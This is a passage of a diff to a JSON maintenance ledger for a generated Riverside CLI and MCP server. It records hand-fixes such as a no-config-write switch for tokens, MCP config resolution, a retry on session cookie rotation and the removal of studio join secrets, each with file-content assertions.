-   "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. PR #309 covered 12 connectors; this connector was one of the three auto-persisters it missed (client.do's sliding-session cookie rotation, which calls SaveAccessToken on every response, internal/client/client.go). Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login --chrome`, the only command on this connector that writes a credential on purpose, must REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) The MCP server runs this same config package, so it honours the switch (its config-path resolution is a separate ledger entry, mcp-config-resolves-like-the-cli). The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. The tests prove both directions: under the switch the real persistence route (client.Get against a local double that rotates riverside_auth_access; the rotated cookie must stay in memory because the 401/403 retry and every later request in the process depend on it) updates the in-memory value and leaves the file absent (or byte-identical when one already exists); with the switch unset or any falsey spelling the bytes written are identical to before. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.",
+   "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. PR #309 covered 12 connectors; this connector was one of the three auto-persisters it missed (client.do's sliding-session cookie rotation, which calls SaveAccessToken on every response, internal/client/client.go). Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login --chrome`, the only command on this connector that writes a credential on purpose, must REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) The MCP server runs this same config package, so it honours the switch (its config-path resolution is a separate ledger entry, mcp-config-resolves-like-the-cli). The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. The tests prove both directions: under the switch the real persistence route (client.Get against a local double that rotates riverside_auth_access; the rotated cookie must stay in memory because the 401/403 retry and every later request in the process depend on it) updates the in-memory value and leaves the file absent (or byte-identical when one already exists); with the switch unset or any falsey spelling the bytes written are identical to before. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache. Reprint 2026-11-02 (press 4.35.1): the sliding-session rotation no longer goes through SaveAccessToken (gone): the press's persistent cookie jar writes every rotated cookie to cookies.json. The switch now also swaps in MemoryOnlyJar through registerClientHook (CLI and MCP clients), so one saveCredentialMaterial call site remains (SaveTokens). TestNoConfigWriteKeepsTheRotatedCookieInMemoryOnly was rewritten for the jar; both tests prove both directions.",
    "status": "active",
    "spec_encode_followup": "cli-printing-press should emit <PREFIX>_NO_CONFIG_WRITE (or an equivalent) as part of the standard config surface, with the same three boundaries: the erase path exempt, explicit save commands failing loudly rather than no-oping, and every best-effort auto-persist route (OAuth mint, JWT exchange, cookie rotation) routed through the single gated writer.",
    "asserts": [
@@ -457,12 +459,6 @@
      "file": "cli/internal/config/config.go",
      "contains": "func (c *Config) saveCredentialMaterial() error {",
      "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "return c.saveCredentialMaterial()",
-     "min_count": 2,
      "code_only": true
     },
     {
@@ -515,13 +511,37 @@
      "file": "guide.md",
      "contains": "| `auth login --chrome` | Refuses, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/memory_jar.go",
+     "contains": "func MemoryOnlyJar(jar http.CookieJar) http.CookieJar {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_no_config_write.go",
+     "contains": "c.HTTPClient.Jar = client.MemoryOnlyJar(c.HTTPClient.Jar)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_no_config_write_test.go",
+     "contains": "func TestNoConfigWriteHookKeepsJarOffDisk(",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "mcp-config-resolves-like-the-cli",
    "summary": "The MCP server resolves its config through config.Load(\"\") - honouring RIVERSIDE_FM_CONFIG and RIVERSIDE_FM_NO_CONFIG_WRITE exactly like the CLI - instead of a hardcoded ~/.config/riverside-fm-cli/config.toml (issue #270)",
-   "why": "Issue #270 (@Xenith-B): internal/mcp/tools.go built the config path by hand - filepath.Join(home, \".config\", \"riverside-fm-cli\", \"config.toml\") - and passed it to config.Load, so the MCP server ignored RIVERSIDE_FM_CONFIG entirely. That made --config / RIVERSIDE_FM_CONFIG inert for every MCP install: a Claude Desktop operator had no way to point the server at a different config file, and no way to keep it away from a plaintext token cache under the home directory. newMCPClient now calls config.Load(\"\"), the same resolver the CLI uses (root.go newClient), which reads RIVERSIDE_FM_CONFIG, falls back to the identical default path, and applies RIVERSIDE_FM_NO_CONFIG_WRITE (ledger entry no-config-write-switch). The test seeds a config at a non-default path, points RIVERSIDE_FM_CONFIG at it, and asserts the MCP client's Config.Path and base_url come from that file - the exact scenario the hardcoded path broke. GENERATOR-class: the press template still hardcodes the path, so a reprint restores the defect while go build and go test stay green; this entry is what notices.",
+   "why": "Issue #270 (@Xenith-B): internal/mcp/tools.go built the config path by hand - filepath.Join(home, \".config\", \"riverside-fm-cli\", \"config.toml\") - and passed it to config.Load, so the MCP server ignored RIVERSIDE_FM_CONFIG entirely. That made --config / RIVERSIDE_FM_CONFIG inert for every MCP install: a Claude Desktop operator had no way to point the server at a different config file, and no way to keep it away from a plaintext token cache under the home directory. newMCPClient now calls config.Load(\"\"), the same resolver the CLI uses (root.go newClient), which reads RIVERSIDE_FM_CONFIG, falls back to the identical default path, and applies RIVERSIDE_FM_NO_CONFIG_WRITE (ledger entry no-config-write-switch). The test seeds a config at a non-default path, points RIVERSIDE_FM_CONFIG at it, and asserts the MCP client's Config.Path and base_url come from that file - the exact scenario the hardcoded path broke. GENERATOR-class: the press template still hardcodes the path, so a reprint restores the defect while go build and go test stay green; this entry is what notices. Reprint 2026-11-02 (press 4.35.1): native in the render (newMCPConfig calls config.Load(\"\")); the test now calls newMCPClient(ctx) and takes the extra session return.",
    "status": "active",
    "spec_encode_followup": "cli-printing-press should generate newMCPClient (and the platform-bound newMCPConfig variant) with config.Load(\"\") rather than a hand-built home-relative path; the hardcoded path is a generator defect that makes <PREFIX>_CONFIG inert for every MCP install on every connector.",
    "asserts": [
@@ -545,235 +565,668 @@
   {
    "id": "workflow-archive-reports-success-count",
    "summary": "NOT APPLIED - deferred to the reprint #312 tracks (issue #275 finding 3): the 4.4.0 print's archive has an empty resource list, makes no requests, and an unconditional zero-guard would fail every run",
-   "why": "Issue #275 finding 3 was fixed on the standard-template connectors in the 2026-09-18 wave (upstream #4410 shape). riverside-fm was deliberately excluded: its 4.4.0 print declares `resources := []string{}` in channel_workflow.go and an empty endpoint map in sync.go, so `workflow archive` performs zero requests and reports `Archived 0 items across 0 resources`. The upstream guard is `resourcesSynced == 0 && len(resources) > 0`, which is a no-op on an empty list, so applying it would change nothing observable while a test for it could never reach the aggregation (there is nothing to 401). F3 for this connector arrives with the reprint that populates the resource list (issue #312). This entry is a TRIPWIRE: it pins the empty list so that the reprint, which will replace it, fails this gate and the maintainer applies the #4410 shape plus the behavioural test in the same change instead of inheriting a false-success archive.",
+   "why": "Issue #275 finding 3 was fixed on the standard-template connectors in the 2026-09-18 wave (upstream #4410 shape). riverside-fm was deliberately excluded: its 4.4.0 print declares `resources := []string{}` in channel_workflow.go and an empty endpoint map in sync.go, so `workflow archive` performs zero requests and reports `Archived 0 items across 0 resources`. The upstream guard is `resourcesSynced == 0 && len(resources) > 0`, which is a no-op on an empty list, so applying it would change nothing observable while a test for it could never reach the aggregation (there is nothing to 401). F3 for this connector arrives with the reprint that populates the resource list (issue #312). This entry is a TRIPWIRE: it pins the empty list so that the reprint, which will replace it, fails this gate and the maintainer applies the #4410 shape plus the behavioural test in the same change instead of inheriting a false-success archive. Reprint 2026-11-02 (press 4.35.1): 4.35.1 emits no sync layer for this spec (every endpoint is nested under a studio, project or take id) and therefore no `workflow archive` at all, so there is no false-success archive to guard. TRIPWIRE kept, re-aimed: if a later reprint emits an archive subcommand again, these asserts fail and the maintainer applies the #4410 zero-guard plus its behavioural test in that change.",
    "status": "active",
    "spec_encode_followup": "Reprint from press >= 4.31.3 (issue #312) regenerates channel_workflow.go with the zero-guard; add workflow_archive_outcome_test.go then.",
    "asserts": [
     {
      "file": "cli/internal/cli/channel_workflow.go",
-     "contains": "resources := []string{}",
-     "min_count": 1,
-     "code_only": true
+     "not_contains": "Archived %d items"
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "not_contains": "\"archive\""
     }
    ]
   },
   {
    "id": "companion-cli-windows-exe-sibling",
    "summary": "SiblingCLIPath tries the sibling `riverside-fm-cli.exe` before the bare name on Windows and looks up `riverside-fm-cli.exe` on PATH there, matching the hudu-era press shape (siblingCLICandidates / cliExecutableName)",
-   "why": "Found by Codex reviewing the companion-CLI bundle (2026-09-18): the 4.4.0 print's cli_path.go stat'ed only the extensionless sibling `riverside-fm-cli` and had no Windows handling at all, so a Windows .mcpb bundle that ships riverside-fm-cli.exe next to riverside-fm-mcp.exe never resolved its own CLI, silently fell through to RIVERSIDE_FM_CLI_PATH and then a PATH lookup for the extensionless name, and every Cobra-mirror MCP tool failed on Windows unless the operator had separately installed the CLI. Ported hudu's shape verbatim with the slug swapped: sibling .exe first on windows, then bare; then RIVERSIDE_FM_CLI_PATH; then exec.LookPath of the per-OS executable name. cli_path_test.go pins the candidate order per GOOS without needing a Windows runner. GENERATOR-class for this connector: a reprint from a press older than the one that introduced siblingCLICandidates restores the defect; retire after the #312 reprint confirms the shape is regenerated. DONE UPSTREAM: mvanhorn/cli-printing-press#4787 merged 2026-09-23 (closed #4745), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4745 as open. Upstream receipt: internal/generator/templates/cobratree/cli_path.go.tmpl:17 SiblingCLIPath now passes runtime.GOOS AND runtime.GOARCH; siblingCLICandidates(goos, goarch, exePath string) at :32-48 tries the bare name, <bare>-<GOOS>-<GOARCH>, then <bare>-<GOOS>, each as .exe first on windows and then extensionless; the <PREFIX>_CLI_PATH override and exec.LookPath(cliExecutableName(runtime.GOOS)) at :26 are unchanged. The hudu-era two-argument signature this entry asserts is NOT what a 4.32.5 print emits: The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
+   "why": "Found by Codex reviewing the companion-CLI bundle (2026-09-18): the 4.4.0 print's cli_path.go stat'ed only the extensionless sibling `riverside-fm-cli` and had no Windows handling at all, so a Windows .mcpb bundle that ships riverside-fm-cli.exe next to riverside-fm-mcp.exe never resolved its own CLI, silently fell through to RIVERSIDE_FM_CLI_PATH and then a PATH lookup for the extensionless name, and every Cobra-mirror MCP tool failed on Windows unless the operator had separately installed the CLI. Ported hudu's shape verbatim with the slug swapped: sibling .exe first on windows, then bare; then RIVERSIDE_FM_CLI_PATH; then exec.LookPath of the per-OS executable name. cli_path_test.go pins the candidate order per GOOS without needing a Windows runner. GENERATOR-class for this connector: a reprint from a press older than the one that introduced siblingCLICandidates restores the defect; retire after the #312 reprint confirms the shape is regenerated. DONE UPSTREAM: mvanhorn/cli-printing-press#4787 merged 2026-09-23 (closed #4745), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4745 as open. Upstream receipt: internal/generator/templates/cobratree/cli_path.go.tmpl:17 SiblingCLIPath now passes runtime.GOOS AND runtime.GOARCH; siblingCLICandidates(goos, goarch, exePath string) at :32-48 tries the bare name, <bare>-<GOOS>-<GOARCH>, then <bare>-<GOOS>, each as .exe first on windows and then extensionless; the <PREFIX>_CLI_PATH override and exec.LookPath(cliExecutableName(runtime.GOOS)) at :26 are unchanged. The hudu-era two-argument signature this entry asserts is NOT what a 4.32.5 print emits: The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Reprint 2026-11-02 (press 4.35.1): absorbed natively (3-argument siblingCLICandidates); asserts and cli_path_test.go re-pinned to the regenerated shape.",
    "status": "upstreamed",
    "spec_encode_followup": "None: the press already emits this shape (hudu and the other 4.24+ prints carry it). Regenerated by the #312 reprint.",
    "asserts": [
     {
      "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "func siblingCLICandidates(goos, exePath string) []string {",
+     "contains": "func siblingCLICandidates(goos, goarch, exePath string) []string {",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "return []string{filepath.Join(dir, name+\".exe\"), filepath.Join(dir, name)}",
+     "contains": "candidates = append(candidates, filepath.Join(dir, name+\".exe\"))",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "return exec.LookPath(cliExecutableName(runtime.GOOS))",
+     "contains": "os.Getenv(\"RIVERSIDE_FM_CLI_PATH\")",
      "min_count": 1,
      "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "if v := os.Getenv(\"RIVERSIDE_FM_CLI_PATH\"); v != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "not_contains": "candidate := filepath.Join(filepath.Dir(exe), cliName)"
     },
     {
      "file": "cli/internal/mcp/cobratree/cli_path_test.go",
      "contains": "func TestSiblingCLICandidatesPerOS(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-commands-wired-through-generated-constructors",
+   "summary": "internal/cli/novel_wiring.go defines each newNovel*Cmd constructor the 4.35.1 root.go and parent groups call (bulk, grab, media, ready, search, stale, transcripts, wait, clips harvest, clips list) as the shipped implementation, so root.go stays untouched and every novel command is registered.",
+   "why": "Reprint 2026-11-02 (press 4.35.1): the novel commands shipped on 4.4.0 with their own constructor names (newBulkCmd ...). 4.35.1 emits scaffold stubs and registers them by generated names. Replacing the stubs with the shipped files and bridging the names in one markerless file keeps the generated root.go byte-identical to the render. A reprint that re-emits the stubs (bulk_export.go, transcripts_convert.go, transcripts_talktime.go, media.go) would duplicate commands; this entry notices.",
+   "status": "active",
+   "spec_encode_followup": "None: novel bodies are hand-authored by definition.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_wiring.go",
+     "contains": "return newBulkCmd(flags)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_wiring.go",
+     "contains": "return newStaleCmd(flags)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_wiring.go",
+     "contains": "return newClipsListCmd(flags)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelStaleCmd(flags))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "not_contains": "TODO: implement novel feature"
+    }
+   ]
+  },
+  {
+   "id": "stale-take-detector-live",
+   "summary": "`stale` is a live cross-studio stuck-take detector: walks each --studio's projects -> takes -> assets and reports takes older than --hours/--days that are still uploading, processing or transcribing, with fetch_failures/first_error and a hard failure when every fetch failed.",
+   "why": "Reprint 2026-11-02 (press 4.35.1): the 'Stale take detector' novel shipped on 4.4.0 only as the generic pattern-pack `stale` over a local store that the connector's sync could never fill (empty resource map), so it could not answer its own question. 4.35.1 renamed the pattern-pack command to riverside-fm-stale and emitted a TODO stub for the novel. classifyStaleTake is pinned by stale_take_test.go (uploading / processing / done / no-tracks / undated / malformed).",
+   "status": "active",
+   "spec_encode_followup": "None: novel body.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "func classifyStaleTake(data json.RawMessage)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "if fetches > 0 && res.FetchFailures == fetches {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale_take_test.go",
+     "contains": "func TestClassifyStaleTake(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "session-cookie-rotation-retry-once",
+   "summary": "A 401/403 that rotates riverside_auth_access is retried once with the rotated cookie (internal/cli/riverside_session_retry.go, a transport installed through registerClientHook).",
+   "why": "Unrecorded hand edit found by diffing the published tree against a fresh 4.4.0 render (reprint 2026-11-02). Riverside refreshes browser sessions by sliding: every response, 401/403 included, sets a fresh ~15-minute riverside_auth_access validated against the ~60-day refresh cookie, and a retry with the rotated cookie succeeds (observed live at first print). The published client.go did this inside do(); 4.35.1's cookie jar keeps the rotation for the NEXT request but the first request after the access cookie lapses still failed. The transport retries only a replayable request that carried a session cookie, only when a JWT-shaped rotated value arrived, at most once, to the same URL. Tests prove both directions and the no-loop bound.",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press: cookie auth could retry once on 401/403 when the response rotated a configured session cookie (sliding sessions).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/riverside_session_retry.go",
+     "contains": "c.HTTPClient.Transport = &sessionRetryTransport{base: c.HTTPClient.Transport}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_session_retry_test.go",
+     "contains": "func TestSessionRetryUsesRotatedCookieOnce(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_session_retry_test.go",
+     "contains": "func TestSessionRetryNeverLoops(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "windows-chrome-dir-via-usercachedir",
+   "summary": "auth.go finds the Windows Chrome data dir through os.UserCacheDir() (which is %LocalAppData%) instead of os.Getenv(\"LOCALAPPDATA\").",
+   "why": "Unrecorded hand edit found by diffing the published tree against a fresh 4.4.0 render (reprint 2026-11-02); 4.35.1 still emits the raw read. A raw os.Getenv of an OS variable reads to the env-schema gate as an undeclared operator credential the .mcpb bundle would have to prompt for. Same fallback behaviour.",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press: auth_browser template could use os.UserCacheDir() on Windows.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "localAppData, cacheErr := os.UserCacheDir()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "os.Getenv(\"LOCALAPPDATA\")"
+    }
+   ]
+  },
+  {
+   "id": "root-short-names-riverside",
+   "summary": "root.go Short reads `Riverside CLI with priority-fallback grab, bulk studio export, and cross-studio readiness for Pro-tier accounts` and Long opens `Riverside CLI`, not the title-cased slug `Riverside Fm CLI` with a truncated headline.",
+   "why": "Unrecorded hand edit found by diffing the published tree against a fresh 4.4.0 render (reprint 2026-11-02); 4.35.1 still renders the slug title-case and truncates the headline mid-sentence in Short (press-traps s7).",
+   "status": "active",
+   "spec_encode_followup": "Short is spec-encoded: spec.yaml cli_description, which the 4.35.1 root.go template renders as Short and dogfood accepts. Long's `Riverside CLI` lead-in is still a hand edit; cli-printing-press: Long should use the spec display_name.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Short: `Riverside CLI with priority-fallback grab",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "Riverside Fm CLI"
+    }
+   ]
+  },
+  {
+   "id": "magic-clips-list",
+   "summary": "`clips list` lists a project's Made-for-you Magic Clips (GET /api/v4/projects/{projectId}/clips) with Riverside's AI rating and in/out points, and `clips harvest` lists from that route instead of .../clips/exports.",
+   "why": "Library-only patch (cc-skills, 2026-09-15, never reached msp-skills) carried by this reprint. The exports route lists RENDERED export jobs, not clips: a project with 21 Magic Clips returns {\"clips\":[],\"total\":0} there until someone presses Export, so harvest printed []. Validated live at the time: 21 clips (12 Clip + 6 Hook + 3 Episode) with calculatedScore 70-99. The spec gained projects.list_clips, so the endpoint also renders natively as `projects list-clips`.",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded (library spec.yaml projects.list_clips); the novel bodies are hand-authored.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/clips_list.go",
+     "contains": "func newClipsListCmd(flags *rootFlags) *cobra.Command {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/clips_harvest.go",
+     "contains": "gatherMagicClips(cmd.Context(), c, projectID, typeFilter, takeFilter, minScore, true, limit)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/clips_harvest.go",
+     "not_contains": "/clips/exports\","
+    }
+   ]
+  },
+  {
+   "id": "mcp-never-writes-host-files",
+   "summary": "grab and bulk export are mcp:hidden; clips harvest drops --out/--download and media refresh drops --out/--prefetch from their MCP schemas (mcp:write-flags).",
+   "why": "The published tree marked all four mcp:read-only while they write media to ./, ./riverside-export, ./clips and ./media-refresh by default, so an MCP client could make the server write customer recordings onto the host. The press blocks --out natively but not the bool switches or the default dirs. TestMCPToolsNeverWriteHostFiles failed on the graft before this fix.",
+   "status": "active",
+   "spec_encode_followup": "Hand annotations on hand-authored novel files; nothing to encode in the spec.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/grab.go",
+     "contains": "\"mcp:hidden\": \"true\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "\"mcp:hidden\": \"true\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/clips_harvest.go",
+     "contains": "\"mcp:write-flags\": \"out,download\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/media_refresh.go",
+     "contains": "\"mcp:write-flags\": \"out,prefetch\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/mcp_no_host_write_test.go",
+     "contains": "func TestMCPToolsNeverWriteHostFiles(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "search-reads-press-store",
+   "summary": "`search` opens the store at defaultDBPath(\"riverside-fm-pp-cli\"), the file live reads write through to, and no longer tells the user to run the nonexistent `sync`.",
+   "why": "The published search read a hardcoded ~/.local/share/riverside-fm-pp-cli/store.db that nothing writes (the press store is cliutil.DataDir()/data-<scope>.db), so every search failed or came back empty. 4.35.1 emits no sync for this all-nested spec; the write-through cache is the only filler. TestSearchReadsThePressStore failed on the graft before the fix.",
+   "status": "active",
+   "spec_encode_followup": "Hand-authored novel; nothing to encode.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/search.go",
+     "contains": "dbPath = defaultDBPath(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/search.go",
+     "not_contains": "store.db"
+    },
+    {
+     "file": "cli/internal/cli/search_store_test.go",
+     "contains": "func TestSearchReadsThePressStore(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dead-template-helpers-removed",
+   "summary": "helpers.go drops requiredInputWaived, hasChangedLocalFlags, retainCLIQueryParams and retainExplicitQueryParams, and root.go drops the --max-age persistent flag; nothing in this connector calls or reads them.",
+   "why": "The 4.35.1 template emits them for sync and generated query paths this all-nested spec does not get. Dogfood failed on the dead flag and the scorecard docked Dead Code to 2/5. --max-age only fed a stale-store hint that suggests `sync`, which does not exist here, and it showed up in every MCP tool schema.",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press: emit these helpers and --max-age only when a caller is generated.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func requiredInputWaived("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func hasChangedLocalFlags("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainCLIQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainExplicitQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "\"max-age\""
+    }
+   ]
+  },
+  {
+   "id": "skill-magic-clips-section",
+   "summary": "SKILL.md carries a Magic Clips section: the /clips vs /clips/exports routes, the per-clip metadata table, and why --download usually reports not-rendered.",
+   "why": "Library-only doc edit (cc-skills, 2026-09-15) that travels with the magic-clips-list patch. The generated SKILL.md only lists the command; agents need the route and metadata facts to use it correctly.",
+   "status": "active",
+   "spec_encode_followup": "Hand-authored doc section appended to a generated file.",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "## Magic Clips - the \"Made for you\" tab",
      "min_count": 1
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "summary": "Shared credential kit wired: Start and Exit in both mains, the chrome transport behind the outbound guard, jar writes atomic and private, children through RunCommand, file writes through the kit.",
+   "why": "Every credential class closes through the kit. A reprint regenerates the mains and transports, so each seam must be replayed. Media bodies from signed CDN URLs stay outside the kit on purpose: they carry no credential and run to gigabytes of binary.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func holdSession(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/riverside-fm-cli/main.go",
+     "contains": "credkit.Start(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/riverside-fm-mcp/main.go",
+     "contains": "credkit.Start(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/chrome.go",
+     "contains": "cliutil.OutboundGuard(rt)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/cookiejar.go",
+     "contains": "AtomicWriteCredentialFile(",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.RunCommand(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cliutil.Hold(\"minted:browser-cookie\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/media_refresh.go",
+     "contains": "Transport: cliutil.OutboundGuard(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestHeldCredentialRefusedOffOriginAndOverPlainHTTP(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "join-secrets-removed",
+   "class": "credential-kit",
+   "summary": "producerSecret, guestSecret and shareToken are held and removed at any depth of every JSON response, in a client transport hook.",
+   "why": "Those values let someone join a studio as the host or a guest. No command needs them, and declared ResponseFields would read bodies whole and fail closed past 64 MiB.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/riverside_join_secrets.go",
+     "contains": "var joinSecretFields = map[string]bool{\"producersecret\": true, \"guestsecret\": true, \"sharetoken\": true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStudioJoinSecretsNeverReachAnySink(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "failed-rows-exit-nonzero",
+   "class": "failed-fetch-or-write-reported-as-success",
+   "summary": "media refresh and clips harvest return an error when any row failed; bulk export counts a checkpoint only after the cursor write succeeded.",
+   "why": "A failed fetch or write was reported as success or absence, so a scripted run read a partial archive as complete and a resumed export skipped the take forever.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/riverside_row_status.go",
+     "contains": "func rowsIncomplete(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/media_refresh.go",
+     "contains": "return rowsIncomplete(\"media refresh\", statuses)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/clips_harvest.go",
+     "contains": "return rowsIncomplete(\"clips harvest\", statuses)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "summary.TakesCheckpointed++",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "cdp-no-websocket-dep",
+   "class": "dependency",
+   "summary": "The cookie-auth template's WebSocket CDP eval is removed; a matching tab reports an install hint, as the published build did.",
+   "why": "The template imports github.com/gorilla/websocket, which is not on dep_allowlist.json. A new dependency needs the owner. agent-browser, browser-use, Chrome cookie import and --cookies-file cover login without it.",
+   "asserts": [
+    {
+     "file": "cli/go.mod",
+     "not_contains": "gorilla/websocket"
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "gorilla/websocket"
+    }
+   ]
+  },
+  {
+   "id": "lists-read-every-page",
+   "class": "silent-truncation",
+   "summary": "bulk export, ready, stale, media refresh and clips list read a list through listAll, which walks offset until a page adds nothing new.",
+   "why": "They read offset 0 only, so a studio past 200 projects or a project past 100 takes was silently cut short with exit 0.",
